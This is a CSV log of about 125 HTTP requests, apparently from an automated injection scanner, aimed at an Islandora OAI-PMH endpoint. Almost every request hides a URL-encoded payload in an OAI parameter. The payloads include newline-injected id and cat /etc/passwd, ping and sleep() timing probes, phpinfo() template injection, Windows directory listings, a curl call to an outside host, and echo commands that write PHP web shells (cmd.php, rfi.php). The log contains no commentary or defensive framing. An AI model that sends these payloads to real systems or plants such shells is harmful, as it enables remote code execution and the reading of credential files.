uuid,timestamp,http_status_code,request_url,response_time,http_version
c8a32ff0-3714-4fc2-a872-18b02f9bfc30,2025-01-28 08:18:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,82.58 ms,HTTP/1.1
30a4a9b9-35d6-475a-adad-6951d08a42f3,2025-01-28 08:18:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250A%2Fusr%2Fbin%2Fid%250A&until=%250A%2Fusr%2Fbin%2Fid%250A,48.61 ms,HTTP/1.1
ae6b8894-12a3-4bd0-a127-34e2f261ecff,2025-01-28 08:18:24,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid%250A&metadataPrefix=marc,45.66 ms,HTTP/1.1
d30d924b-2193-4123-87ff-5b5283680859,2025-01-28 08:18:24,200,http://islandora.io/oai/request?verb=%250Acat%2520%2Fetc%2Fpasswd,65.47 ms,HTTP/1.1
ebc376ff-ada4-461e-994f-ef7cbf7ead2b,2025-01-28 08:18:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.43 ms,HTTP/1.1
d5deffc0-8a64-44ea-9afc-4bbd9383d540,2025-01-28 08:18:25,200,http://islandora.io/oai/request?verb=ListSets,52.05 ms,HTTP/1.1
8def30e1-702f-44a2-8069-66c00a77e7c0,2025-01-28 08:18:25,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,43.91 ms,HTTP/1.1
c6393ba9-11b8-491f-8b9f-46cf611cdba6,2025-01-28 08:18:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Acat%2520%2Fetc%2Fpasswd&set=%250Acat%2520%2Fetc%2Fpasswd,63.74 ms,HTTP/1.1
ae04a74b-9e3d-4910-9980-76882695d9ca,2025-01-28 08:18:26,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Acat%2520%2Fetc%2Fpasswd&metadataPrefix=marc,65.24 ms,HTTP/1.1
7c2a22b7-87b9-4b0f-a4b3-0f8897ee6bff,2025-01-28 08:18:26,200,http://islandora.io/oai/request?verb=%250Aid,67.97 ms,HTTP/1.1
8794b6d3-bbd4-47ec-a468-1ddb69299aa8,2025-01-28 08:18:27,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250Aid,78.77 ms,HTTP/1.1
e0183e79-6ace-4ead-a008-f2e13402d6ab,2025-01-28 08:18:27,200,http://islandora.io/oai/request?verb=ListSets,31.64 ms,HTTP/1.1
877c26e0-b965-4295-91fd-4a8c917e49ed,2025-01-28 08:18:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250Aid&until=%250Aid,69.22 ms,HTTP/1.1
f2be1d1d-10eb-4b65-b4b7-f3ca4a3a109d,2025-01-28 08:18:28,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250Aid&set=%250Aid,63.67 ms,HTTP/1.1
af9b92da-3b43-4c05-8f3a-e462442e934b,2025-01-28 08:18:28,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid&metadataPrefix=marc,34.17 ms,HTTP/1.1
d4b078f2-fde1-4b7c-a24b-e67ce1b191ac,2025-01-28 08:18:29,200,http://islandora.io/oai/request?verb=%250Aid%250A,45.79 ms,HTTP/1.1
67bd71a6-247b-4697-b56a-cbf37b80e5e6,2025-01-28 08:18:29,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250Aid%250A,65.77 ms,HTTP/1.1
b427a011-2cc5-4372-8c67-360db851ac33,2025-01-28 08:18:29,200,http://islandora.io/oai/request?verb=ListSets,51.78 ms,HTTP/1.1
c74aadc6-0ccc-450b-8a01-b8d7cb357a95,2025-01-28 08:18:30,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250Aid%250A&until=%250Aid%250A&set=%250Aid%250A,69.02 ms,HTTP/1.1
385e32ac-8c32-42e2-8e92-6516125212d6,2025-01-28 08:18:30,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250Aid%250A&until=%250Aid%250A&set=%250Aid%250A,71.26 ms,HTTP/1.1
8bc8d54c-d73e-4f66-81f9-7f9e290c7009,2025-01-28 08:18:30,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid%250A&metadataPrefix=oai_dc,61.91 ms,HTTP/1.1
d70e6522-9ab8-4ee5-9055-b14f192700ab,2025-01-28 08:18:31,200,http://islandora.io/oai/request?verb=%250a,54.97 ms,HTTP/1.1
b0a2b10b-1f1d-4d73-81f0-82ecc02b0514,2025-01-28 08:18:31,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a,35.15 ms,HTTP/1.1
de89e4a1-0954-4610-a52b-63cf6bb48095,2025-01-28 08:18:31,200,http://islandora.io/oai/request?verb=ListSets,30.49 ms,HTTP/1.1
be09d97d-0722-4986-b8f9-01dd3fbeae36,2025-01-28 08:18:32,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250a,62.30 ms,HTTP/1.1
b2588074-ed91-49bf-aa78-4ed9485a5705,2025-01-28 08:18:32,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250a,60.47 ms,HTTP/1.1
54d8421b-b34f-4634-9662-5a572f8a5c95,2025-01-28 08:18:32,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a&metadataPrefix=oai_dc,54.79 ms,HTTP/1.1
24bfaf74-af8c-4201-b0fc-3ca7440f2d90,2025-01-28 08:18:33,200,http://islandora.io/oai/request?verb=%250a+id+%250a,61.56 ms,HTTP/1.1
4baa34e8-d73a-4e85-af20-bdfec52d3960,2025-01-28 08:18:33,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.09 ms,HTTP/1.1
b1df1987-150f-493b-ba21-2c0e93393662,2025-01-28 08:18:34,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a+id+%250a,45.55 ms,HTTP/1.1
f42ff990-5284-48dd-a966-3ca72acd416f,2025-01-28 08:18:34,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250a+id+%250a,52.66 ms,HTTP/1.1
0c30f7d0-a488-406d-88e2-f9675c7e051f,2025-01-28 08:18:34,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250a+id+%250a,112.83 ms,HTTP/1.1
6959e721-19db-400d-97c2-b7aa3bb49478,2025-01-28 08:18:35,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+id+%250a&metadataPrefix=oai_dc,59.03 ms,HTTP/1.1
5d7aa86a-2349-49b0-98e3-73486647d3ba,2025-01-28 08:18:35,200,http://islandora.io/oai/request?verb=%250a+ping+-i+30+127.0.0.1+%250a,33.83 ms,HTTP/1.1
a9ad1da7-ea6d-45ec-bf14-dba7a9487eb9,2025-01-28 08:18:35,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a+ping+-i+30+127.0.0.1+%250a,46.41 ms,HTTP/1.1
622a273d-3c7c-4a48-a23e-2f07b0876cb8,2025-01-28 08:18:36,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a+ping+-i+30+127.0.0.1+%250a,47.18 ms,HTTP/1.1
8ca580c1-baaa-48d6-b303-c877d0b973da,2025-01-28 08:18:36,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250a+ping+-i+30+127.0.0.1+%250a&set=%250a+ping+-i+30+127.0.0.1+%250a,56.12 ms,HTTP/1.1
c1a314dc-4fb4-4214-9f40-83c12c9d2989,2025-01-28 08:18:36,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250a+ping+-i+30+127.0.0.1+%250a,50.73 ms,HTTP/1.1
f957c066-1f06-46a7-baf6-5eb96acb0353,2025-01-28 08:18:37,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+ping+-i+30+127.0.0.1+%250a&metadataPrefix=marc,57.31 ms,HTTP/1.1
44f15b84-eea3-40df-ae11-8d3f239295a7,2025-01-28 08:18:37,200,http://islandora.io/oai/request?verb=%250a%250d,59.04 ms,HTTP/1.1
cd4abaf2-a1a1-4bf9-b937-dbaeb4f8aad7,2025-01-28 08:18:37,200,http://islandora.io/oai/request?verb=ListMetadataFormats,60.89 ms,HTTP/1.1
ff48ca6b-d310-446d-898a-58a4ee3f9700,2025-01-28 08:18:38,200,http://islandora.io/oai/request?verb=ListSets,50.91 ms,HTTP/1.1
10cc87f6-7e52-46a2-92cd-48d809d4865b,2025-01-28 08:18:38,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250a%250d&set=%250a%250d,34.85 ms,HTTP/1.1
bb85432c-44cc-4b2c-982c-37a350a7f845,2025-01-28 08:18:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250a%250d&set=%250a%250d,65.76 ms,HTTP/1.1
849defbc-8f29-4775-8ad9-543dd29db9da,2025-01-28 08:18:39,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a%250d&metadataPrefix=marc,54.57 ms,HTTP/1.1
eb9ac832-4bcb-4266-a4dd-8dbcac4eeed7,2025-01-28 08:18:39,200,http://islandora.io/oai/request?verb=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,61.69 ms,HTTP/1.1
5dff0cba-c3c6-4f2c-b529-819b58f1d1b3,2025-01-28 08:18:40,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,59.84 ms,HTTP/1.1
7218b928-a167-48c0-ab95-3a3b4e6bb3d4,2025-01-28 08:18:40,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,53.81 ms,HTTP/1.1
826b153b-ad49-4bfd-9187-e86f95d21101,2025-01-28 08:18:40,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,44.98 ms,HTTP/1.1
5a4ee011-7927-4f52-bd29-efb30663c2e7,2025-01-28 08:18:41,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,56.25 ms,HTTP/1.1
7b54880f-1135-4080-85f2-b4fa713c94e1,2025-01-28 08:18:41,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&metadataPrefix=oai_dc,75.51 ms,HTTP/1.1
04cac151-ed0d-48ce-ab92-b5515151727a,2025-01-28 08:18:41,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bphpinfo%28%29%7D%7D,54.00 ms,HTTP/1.1
e7c52c62-9d86-4328-8cdc-52b9bcec1596,2025-01-28 08:18:42,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D,68.93 ms,HTTP/1.1
1880dca1-fc4f-45ff-bba7-c945deb09c03,2025-01-28 08:18:42,200,http://islandora.io/oai/request?verb=ListSets,52.74 ms,HTTP/1.1
610fae10-97c0-4af2-9bb2-776c9ba6a74b,2025-01-28 08:18:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,48.95 ms,HTTP/1.1
a19fd703-e8d9-4a76-bd97-a199dea028c7,2025-01-28 08:18:43,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D,67.23 ms,HTTP/1.1
95732ab9-6dff-4e0c-a249-673d5dac96bf,2025-01-28 08:18:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D&metadataPrefix=oai_dc,57.10 ms,HTTP/1.1
72947288-c326-4661-abe8-74a8837fc124,2025-01-28 08:18:43,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%2820%29%7D%7D,78.48 ms,HTTP/1.1
d19f252a-1881-4b2e-88fb-10c0e65ccd89,2025-01-28 08:18:44,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.09 ms,HTTP/1.1
bdac332b-dcf8-4efe-a567-448d33df22b4,2025-01-28 08:18:44,200,http://islandora.io/oai/request?verb=ListSets,37.53 ms,HTTP/1.1
d9cb55d4-59ac-4f43-80be-4d1080fc2904,2025-01-28 08:18:45,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%2520%7B%24%7Bsleep%2820%29%7D%7D&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,64.28 ms,HTTP/1.1
e498a0ee-bba8-4552-89b1-f1c15ba20cde,2025-01-28 08:18:45,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%2520%7B%24%7Bsleep%2820%29%7D%7D&until=%2520%7B%24%7Bsleep%2820%29%7D%7D&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,69.46 ms,HTTP/1.1
792cffbe-ca54-4ee2-a461-793aaeb84114,2025-01-28 08:18:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D&metadataPrefix=oai_dc,66.33 ms,HTTP/1.1
32233848-a289-4697-bfeb-3cff08cc8edf,2025-01-28 08:18:46,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%283%29%7D%7D,69.34 ms,HTTP/1.1
9498d8ca-756b-4f0d-b15f-fc990a65e359,2025-01-28 08:18:46,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D,57.23 ms,HTTP/1.1
eb467d33-8be6-4e48-a5f8-6295d285253c,2025-01-28 08:18:46,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%283%29%7D%7D,61.42 ms,HTTP/1.1
214abee6-6c64-4b91-82bd-b8929d9f8130,2025-01-28 08:18:47,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%2520%7B%24%7Bsleep%283%29%7D%7D,58.44 ms,HTTP/1.1
1a93bcd5-d504-45c7-aa73-d3daef289073,2025-01-28 08:18:47,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,55.45 ms,HTTP/1.1
29bd105b-daad-4403-b324-208eb326f1ac,2025-01-28 08:18:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D&metadataPrefix=marc,94.60 ms,HTTP/1.1
2ee48097-1194-4e33-ab9f-db127e88afb1,2025-01-28 08:18:48,200,http://islandora.io/oai/request?verb=%26,80.54 ms,HTTP/1.1
0e959986-f36b-4257-a954-da302f65fa9d,2025-01-28 08:18:48,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26,64.12 ms,HTTP/1.1
17c60e1e-4d25-4657-982c-871320a0cb84,2025-01-28 08:18:48,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26,57.94 ms,HTTP/1.1
f52febd0-38e5-40d7-b65f-474a94570752,2025-01-28 08:18:49,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26,84.59 ms,HTTP/1.1
20942986-21e4-464b-84bd-6cd0c5e22ced,2025-01-28 08:18:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26,112.41 ms,HTTP/1.1
68118c6d-b0f2-493a-914d-965ebd98b5be,2025-01-28 08:18:50,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26&metadataPrefix=marc,59.97 ms,HTTP/1.1
644ad7cb-e604-4033-95b3-56920faaa804,2025-01-28 08:18:50,200,http://islandora.io/oai/request?verb=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,66.49 ms,HTTP/1.1
9e182dcb-2564-4ee9-890b-5249842a502f,2025-01-28 08:18:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,70.19 ms,HTTP/1.1
1e9fb24c-97bc-434b-9be7-64788ccc8daa,2025-01-28 08:18:51,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,65.93 ms,HTTP/1.1
3fe06a7a-1e1f-4547-bf8f-facfc4f2e93e,2025-01-28 08:18:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,62.40 ms,HTTP/1.1
c84d2253-b514-4563-9a52-51b39f55af98,2025-01-28 08:18:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&until=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,85.08 ms,HTTP/1.1
aede0c5f-26e0-4837-8d67-39224f635896,2025-01-28 08:18:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&metadataPrefix=marc,66.47 ms,HTTP/1.1
5cddf37b-73b8-4ba2-abe1-6829e6da5f30,2025-01-28 08:18:52,200,http://islandora.io/oai/request?verb=%26+dir,78.30 ms,HTTP/1.1
a4a24be3-c6a6-4fc5-9ff7-4df00b533e97,2025-01-28 08:18:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir,43.40 ms,HTTP/1.1
c9af88c2-75f6-4caf-9411-794fb705595f,2025-01-28 08:18:53,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+dir,70.60 ms,HTTP/1.1
f0d9107f-5255-4d02-98ab-fc18da68e82a,2025-01-28 08:18:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,47.87 ms,HTTP/1.1
b9e35254-40c9-412a-9660-84d495ec4503,2025-01-28 08:18:54,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26+dir,77.99 ms,HTTP/1.1
6eafc04e-721a-4f3e-8ac4-b0be25a5ec39,2025-01-28 08:18:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir&metadataPrefix=marc,45.09 ms,HTTP/1.1
c40deeac-544d-4d0d-a782-b7def6814271,2025-01-28 08:18:54,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5C,62.84 ms,HTTP/1.1
36d1c729-7bee-49e9-a1c2-5d8645f6e21c,2025-01-28 08:18:55,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.20 ms,HTTP/1.1
a520dda9-c1a1-4b5b-9d1c-d078c34a1ff4,2025-01-28 08:18:55,200,http://islandora.io/oai/request?verb=ListSets,88.89 ms,HTTP/1.1
32eccc3f-3979-4487-a294-fba6c70ebb50,2025-01-28 08:18:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%26+dir+C%3A%5C,49.59 ms,HTTP/1.1
4605f455-868c-4da9-9e70-756c52cc03c7,2025-01-28 08:18:56,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26+dir+C%3A%5C,62.75 ms,HTTP/1.1
7728bd96-8085-449e-849e-3cd2f955b691,2025-01-28 08:18:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5C&metadataPrefix=oai_dc,55.91 ms,HTTP/1.1
0f0a4cba-69b7-433a-b9ed-223564a88a56,2025-01-28 08:18:56,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,53.14 ms,HTTP/1.1
1f8ca59f-b899-444e-a4e0-8aaeed881797,2025-01-28 08:18:57,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,69.83 ms,HTTP/1.1
0724ef29-fbb4-4d7d-94cf-87c817b32708,2025-01-28 08:18:57,200,http://islandora.io/oai/request?verb=ListSets,52.21 ms,HTTP/1.1
14c605bf-7ca5-4873-ae07-46fadadfe3b3,2025-01-28 08:18:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,70.50 ms,HTTP/1.1
2e379c1a-232f-40ec-9551-d24f7379c4d2,2025-01-28 08:18:58,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&set=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,59.75 ms,HTTP/1.1
ced62317-3274-4914-8268-febcb0306d72,2025-01-28 08:18:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&metadataPrefix=oai_dc,58.90 ms,HTTP/1.1
d70980bd-d5e2-4791-a31f-f5f447acac2c,2025-01-28 08:18:58,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CUsers,57.68 ms,HTTP/1.1
d56accc5-3327-4bf6-a763-83ad3f7ad456,2025-01-28 08:18:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.87 ms,HTTP/1.1
cabc3511-f9fa-4e92-a67b-46bf51dd0832,2025-01-28 08:18:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5CUsers,95.57 ms,HTTP/1.1
784f84cc-3497-45fc-b108-2ab0b7936c9d,2025-01-28 08:19:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,61.42 ms,HTTP/1.1
0aa16848-259e-4869-8749-1efdbc31aa47,2025-01-28 08:19:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CUsers&until=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,60.78 ms,HTTP/1.1
a6bbd4b7-0764-4d22-9cdf-d91e45eb5fcf,2025-01-28 08:19:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CUsers&metadataPrefix=oai_dc,65.42 ms,HTTP/1.1
db4bcff1-ef5e-4006-a46b-da85858217b0,2025-01-28 08:19:01,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,49.75 ms,HTTP/1.1
0946c50c-7523-44a3-ad11-6e18bbf554cd,2025-01-28 08:19:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.91 ms,HTTP/1.1
7b9fda9e-f2e6-4014-9480-a359d5e77fea,2025-01-28 08:19:01,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,66.44 ms,HTTP/1.1
d5b5c8c8-241b-4c8c-9b6c-aa0b5ae2800a,2025-01-28 08:19:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&set=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,43.70 ms,HTTP/1.1
10f4fa19-f6c1-4c61-8652-8f32a00ef8f6,2025-01-28 08:19:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,129.46 ms,HTTP/1.1
d238d9e1-2464-473a-a2e2-572a73fedf68,2025-01-28 08:19:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=marc,55.76 ms,HTTP/1.1
f10dd58e-454f-4bb3-aa43-9ffb4b7afd04,2025-01-28 08:19:03,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,55.86 ms,HTTP/1.1
98abe789-0e8e-4e86-b9bd-abed04897c4c,2025-01-28 08:19:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,47.89 ms,HTTP/1.1
995c55af-1795-4189-9a06-dd9c68c26908,2025-01-28 08:19:04,200,http://islandora.io/oai/request?verb=ListSets,44.09 ms,HTTP/1.1
4693cc83-fbb6-4185-aa2f-af96886e1416,2025-01-28 08:19:04,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,64.85 ms,HTTP/1.1
9f227ddf-6f94-43b1-ba5a-c19e65785b44,2025-01-28 08:19:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,32.17 ms,HTTP/1.1
ee7f7cc7-5975-4ba5-968f-a2433b90382c,2025-01-28 08:19:05,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&metadataPrefix=oai_dc,52.33 ms,HTTP/1.1
5d6feb62-a4bf-4b32-b2a0-0285d7c441fa,2025-01-28 08:19:05,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,49.85 ms,HTTP/1.1
66195b24-c01d-4db3-a122-bf2f2edac71d,2025-01-28 08:19:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,48.10 ms,HTTP/1.1
22aaa8ae-578f-4064-86aa-24837c4e998d,2025-01-28 08:19:06,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,79.24 ms,HTTP/1.1
676b3ba7-3415-49e7-98f7-d1e34c4941b4,2025-01-28 08:19:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,49.66 ms,HTTP/1.1
